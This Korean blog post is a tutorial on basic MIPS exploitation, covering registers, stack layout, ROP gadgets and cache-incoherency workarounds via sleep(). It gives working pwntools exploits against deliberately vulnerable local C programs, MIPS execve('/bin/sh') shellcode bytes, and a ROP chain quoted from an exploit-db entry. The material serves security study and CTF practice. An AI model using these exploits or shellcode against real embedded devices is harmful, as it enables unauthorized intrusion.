---
title: "[Research] Exploitation basic in MIPS (KO)"
author: newp1ayer48
tags: [Embedded, MIPS, newp1ayer48]
date: 2025-08-21 19:00:00
categories: [Research]
cc: true
index_img: /2025/08/21/newp1ayer48/mips/ko/image1.jpg
---

안녕하세요! Hackyboiz에서 가장 낮은 곳(low-level)을 맡고 있는 `newp1ayer48` 입니다! 🤸🏻‍♂️

![image1.jpg](image1.jpg)

임베디드 해킹을 진행하다 보면, 다양한 RISC 아키텍처의 바이너리와 환경을 만나게 됩니다.

대부분 ARM 아키텍처를 많이 사용하고 접하는 경우가 많습니다. 그러나 MIPS, MIPSEL 아키텍처 역시 어렵지 않게 마주칠 수 있습니다…

어셈 명령어와 레지스터가 생긴 것부터 낯설고, 게다가 Cache 때문에 고려할 것까지…

다소 이질적인 이 MIPS에서 익스플로잇에 필요한 가장 기본적인 부분을 다뤄보겠습니다!

## 1. MIPS vs MIPSEL

![image2.jpg](image2.jpg)

MIPS는 레지스터와 명령이 하나의 역할을 수행하도록 설계된 RISC 아키텍처 중에 하나 입니다. 레지스터가 많아진다는 단점이 있지만, 명령어가 단순하고 그로 인해 전력 소모가 적기 때문에 임베디드 기기에서 주로 사용됩니다.

MIPS는 명령어 세트가 깔끔하게 정리되었기 때문에, 대학 컴퓨터 구조 때 가르치는 아키텍처가 MIPS인 경우가 많습니다(저도 그랬습니다)…

MIPS는 빅엔디안, MIPSEL은 리틀엔디안으로 이루어집니다. MIPSEL은 데이터 저장 방식만 리틀엔디안으로 채택하기 때문에, MIPS와 같은 방식으로 동작합니다. 기존에 많이 사용하는 x86-64 아키텍처에서도 데이터 저장 방식을 사용하기 때문에, MIPSEL도 동일하게 pwntools 함수를 사용할 수 있습니다. 따라서, MIPSEL 환경에서는 pwntools의 `p32()`, `p64()`를 그대로 사용하시면 됩니다!

## 2. MIPS Stack & Register

익스플로잇에 앞서 MIPS 환경에서 스택 구성과 동작을 이해할 필요가 있습니다.

MIPS 아키텍처의 공식 레퍼런스는 [MIPS32 Architecture For Programmers Volume I](https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf)과 [MIPS Assembly Language Programmer's Guide](https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf) 입니다.

이중 익스플로잇 관점에서 우리에게 필요한 지식을 다뤄보겠습니다. 우선, MIPS에서 사용되는 레지스터 목록과 역할은 아래와 같습니다.

| 이름 | 레지스터 번호 | 역할 |
| --- | --- | --- |
| **`$zero`** | **`$0`** | 0을 출력 |
| **`$at`** | **`$1`** | 의사 명령어 계산 결과를 위해 예약 |
| **`$v0` ~ `$v1`** | **`$2` ~ `$3`** | 함수로부터 반환 된 값을 저장 |
| **`$a0` ~ `$a3`** | **`$4` ~ `$7`** | 함수 인수 저장 |
| **`$t0` ~ `$t7`** | **`$8` ~ `$15`** | 어셈블러나 언어에서 값을 임시 저장 시 사용 |
| **`$s0` ~ `$s7`** | **`$16` ~ `$23`** | 오랫동안 지속되는 값을 저장할 때 사용 |
| **`$t8` ~ `$t9`** | **`$24` ~ `$25`** | 어셈블러나 언어에서 값을 임시로 저장 |
| **`$k0` ~ `$k1`** | **`$26` ~ `$27`** | OS 커널을 위해 예약 |
| **`$gp`** | **`$28`** | 전역 포인터의 값을 저장 |
| **`$sp`** | **`$29`** | 스택 포인터의 값을 저장 |
| **`$fp`/`$s8`** | **`$30`** | 프레임 포인터의 값을 저장 |
| **`$ra`** | **`$31`** | 주소 반환값을 저장 |

이중 눈 여겨 봐야 할 레지스터는 `ra`, `sp`, `s8`입니다.

MIPS에서는 `ra` 레지스터가 함수 리턴 주소를 가집니다. x86/x64의 `RET`의 역할을 한다고 생각하면 편합니다.

```nasm
0x00400734 <main+0>:    addiu   sp,sp,-136
0x00400738 <main+4>:    sw      ra,132(sp)
0x0040073c <main+8>:    sw      s8,128(sp)
0x00400740 <main+12>:   move    s8,sp
...
0x004007d8 <main+164>:  move    sp,s8
0x004007dc <main+168>:  lw      ra,132(sp)
0x004007e0 <main+172>:  lw      s8,128(sp)
0x004007e4 <main+176>:  addiu   sp,sp,136
0x004007e8 <main+180>:  jr      ra
```

함수 프롤로그를 통해 `ra` 레지스터에 존재하는 리턴 주소를 스택에 저장하고, 함수 에필로그를 통해 `ra` 레지스터에 존재하는 리턴 주소로 이동하는 구조로 이루어집니다.

`ra` 레지스터는 `sp`(현재 스택 포인터)와 `s8`(프레임 포인터) 레지스터를 통해 리턴 주소를 스택에 저장하기 때문에, `sp` 레지스터를 기준으로 버퍼 시작 위치와 리턴 주소를 계산하여 오프셋을 구하는 것이 스택 기반 익스플로잇의 첫걸음입니다.

```nasm
lw      $s2, 24(sp)      ; sp+24 위치의 값을 $s2에 로드 (&"/bin/sh" 주소)
lw      $s1, 20(sp)      ; sp+20 위치의 값을 $s1에 로드 (&system 주소)
lw      $s0, 16(sp)      ; sp+16 위치의 값을 $s0에 로드 (&sleep 주소)
lw      $ra, 28(sp)      ; sp+28 위치의 값을 $ra에 로드 (다음 가젯 주소)
addiu   sp, sp, 32       ; 스택 포인터 정리
jr      $ra              ; $ra(다음 가젯)로 점프
```

이후에 설명할 Shellcode 및 ROP 체인에서 필요한 가젯의 형태를 위와 같습니다.

`s0-s7` 레지스터를 통해 스택 내 값을 `lw` 명령어로 로드하고, `addiu`로 스택 포인터를 정리한 후, 리턴 주소로 `jr`하는 형태가 가장 기본입니다.

가장 기본적인 형태이므로, 상황과 환경에 맞춰 필요한 인자와 명령어를 잘 조합하면 됩니다.

```nasm
move    $t9, $s1         ; $s1(system 주소)을 $t9(호출용 레지스터)로 이동
jalr    $t9              ; $t9에 있는 주소로 점프
```

함수 실행은 `jalr` 명령을 통해 이루어집니다. x86-64의 `call`과 같은 명령처럼 동작 된다고 이해하시면 됩니다.

## 3. Cache Incoherency

MIPS 환경으로 구성된 실제 장비를 익스할 때, IoT/임베디드 장비 특성 상 Shellcode를 사용할 경우가 존재합니다. 그러나 MIPS 환경에서 Shellcode를 사용할 때는 주의할 점이 있습니다.

바로 Cache입니다.

![image3.png](image3.png)

MIPS에서는 opcode가 들어있는 Instruction Cache, 데이터를 기록하는 Data Cache 두 가지를 사용합니다.

이때, 우리가 입력하는 값(Shellcode)은 Data Cache로 들어가게 되는데, CPU는 기존에 명령이 들어간 Instruction Cache를 실행하는 Cache Incoherency(캐시 비일관성) 문제가 발생합니다.

이를 해결하기 위해서는 Data Cache에서 Instruction Cache로 데이터를 가져와야 합니다. 이는 Cache 쓰기 정책에 따라, 메모리와 동기화 한 후 Instruction Cache를 비우게 됩니다. 여기서 중요한 것은 바로 Data Cache를 flush하여 Cache write를 해야 합니다.

![image4.png](image4.png)

Data Cache가 flush가 된 후의 메모리와 Cache 상태는 위와 같습니다. Instruction Cache와 메모리 명령이 동일하지 않으므로, Instruction Cache를 비웁니다. 그리고 메모리와 동기화 된 Data Cache에 코드를 실행하게 됩니다.

이런 과정을 거쳐야 비로소 삽입한 Shellcode가 실행이 될 수 있는 흐름이 된다고 할 수 있습니다.

![image5.png](image5.png)

가장 손쉬운 방법은 `sleep()` 함수를 호출하는 것입니다.

`sleep()` 호출 시, 다른 프로세스나 스레스에 실행이 넘어가기 때문에, Data Cache에 다른 데이터들이 생성됩니다. 이후 Cache 쓰기 정책에 따라, flush가 되기 때문에 메모리에 존재하는 데이터도 Data Cache가 write 됩니다.

따라서, MIPS 환경에서 shellcode를 사용한다면, `sleep()` 호출을 통해 익스플로잇을 구성하는 것이 좋습니다.

## 4. MIPS Exploit Practice

간단한 예제를 통해서 MIPS 환경에서의 익스플로잇을 연습해보겠습니다.

### 4-1: RTL

```c
#include <stdio.h>
#include <stdlib.h>

void target()
{
        system("/bin/sh");
}

int main(int argc, char *argv[])
{
        setvbuf(stdout, NULL, _IONBF, 0);

        char buf[100];
        scanf("%s", buf);
        printf("%s\n", buf);
        return 0;
}
```

MIPS 환경에서의 기본적인 RTL을 통해 스택 내 offset을 구하는 것을 해보겠습니다. 취약한 함수를 생성하여 bof가 발생하는 예제 코드입니다.

```nasm
0x00400738 <main+4>:    sw      ra,132(sp)  ; ret
0x0040073c <main+8>:    sw      s8,128(sp)
0x00400740 <main+12>:	  move	  s8,sp
...
0x0040079c <main+104>:	addiu	  v0,s8,24  ; buf
0x004007a0 <main+108>:	move	  a1,v0
...
0x004007b0 <main+124>:	jalr	  t9  ; scanf
```

gdb로 어셈을 확인하면 다음과 같은 offset을 구할 수 있습니다.

- 리턴 주소: `sp + 132`

리턴 주소가 들어가는 ra 레지스터에 sp+132 값을 저장하는 것으로 알 수 있습니다.

- 버퍼 시작: `sp + 24`

scanf()의 인자로 들어가는 레지스터 `sp` → `s8 + 24` 연산이 되는 것으로 알 수 있습니다.

따라서 offset은 132 - 24 = 108이라는 것을 알 수 있습니다.

```python
from pwn import *

p = remote("localhost", 3312)

sh = 0x4006e0

pay = b"A" * 108
pay += p32(sh)

p.sendline(pay)
p.interactive()
```

![image6.png](image6.png)

offset을 맞추어 익스플로잇 코드를 작성해서 실행하면 잘 동작하는 것을 확인할 수 있습니다.

### 4-2: shellcode

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
        setvbuf(stdout, NULL, _IONBF, 0);
        sleep(1);

        char buf[100];
        printf("buf: %p\n", buf);
        scanf("%s", buf);
        printf("%s\n", buf);
        return 0;
}
```

앞서 설명한 MIPS에서 발생하는 Cache Incoherency를 고려하여 shellcode를 사용하는 예제입니다. 역시 bof가 발생되는 코드고, NX를 해제하여 빌드 하였습니다.

리턴 주소 offset은 이전 문제와 동일합니다.

![image7.png](image7.png)

추가적으로 스택 정리 가젯은 `__libc_csu_init`내 주소를 사용했습니다.

```python
from pwn import *
import time

p = remote("localhost", 3312)

sh = b"\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01"

sleep_addr = 0x00400970
gadget = 0x00400824

p.recvuntil(b"buf: ")
addr = int(p.recv(10), 16)

log.success("addr is {}".format(hex(addr)))

pay = sh
pay += b"A" * (108 - len(sh))
pay += p32(sleep_addr)
pay += p32(gadget)
pay += p32(addr)

time.sleep(1)
p.sendline(pay)
p.interactive()
```

![image8.png](image8.png)

위와 같이 `sleep()` 함수를 호출하고, 스택 정리 가젯 이후에 shellcode 주소를 호출하는 방식이 가장 기본적입니다. Shellcode는 MIPS용입니다.

실제로 shellcode를 사용하기 위해서는 libc base leak과 `sleep()` 함수 호출에 따른 가젯 호출도 필요하기 때문에, ROP 공격을 진행하게 됩니다. 아래 링크를 참고하시면 됩니다!

https://www.exploit-db.com/exploits/48994

```python
First ROP (sleep_gadget): 0x0004c974 + libc_base = 0x2ab2e974
0x0004c97c      move    t9, s0
0x0004c980      lw      ra, (var_1ch)
0x0004c984      lw      s0, (var_18h)
0x0004c988      addiu   a0, zero, 2 ; arg1
0x0004c98c      addiu   a1, zero, 1 ; arg2
0x0004c990      move    a2, zero
0x0004c994      jr      t9

Second ROP (stack_gadget): 0x00039fa8 + libc_base = 0x2ab1bfa8
0x00039fa8      addiu   s0, sp, 0x28
0x00039fac      move    a0, s3
0x00039fb0      move    a1, s0
0x00039fb4      move    t9, s1
0x00039fb8      jalr    t9

Third ROP (call_gadget): 0x000406d8 + libc_base = 0x2ab226d8
0x000406d8      move    t9, s0
0x000406dc      jalr    t9

payload = "A"*160 + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode

```

해당 링크에서 사용한 ROP 가젯과 페이로드 부분입니다.

첫번째 가젯은 `sleep()` 사용을 위해 필요한 인자 세팅을 진행하는 가젯입니다. 레지스터 값을 `0`으로 초기화할 때, `0`이 아닌 `zero`를 사용하는 것 역시 MIPS의 특징이라고 할 수 있겠습니다!

두번째 가젯은 스택 정리 가젯으로, 앞선 실습에서 소개한 `__libc_csu_init`과 같은 함수들에서 어렵지 않게 찾을 수 있습니다.

마지막으로 함수 호출 가젯과 더불어 ROP 체인을 구성하는 것을 볼 수 있습니다.

끝으로 MIPS 환경에서 실습하기가 조금 어렵고, CTF 문제로 공부해보고 싶으신 분들은 아래 문제들을 참고하시면 될 것 같습니다!

- **Hack.lu 2019 - no_risc_no_future**
- **HackCTF - BabyMIPS**

MIPS와 같은 RISC 아키텍처는 처음에는 낯설지만, 아키텍처 특성에 따른 익스 꿀팁(?)에 익숙해지면 그래도 할만 한 것 같습니다! 처음 MIPS에서 익스플로잇을 하시는 분들에게 조금이나마 도움이 되었으면 좋겠습니다!

다음에는 다른 임베디드 주제로 돌아오도록 하겠습니다! 감사합니다! 👋🏻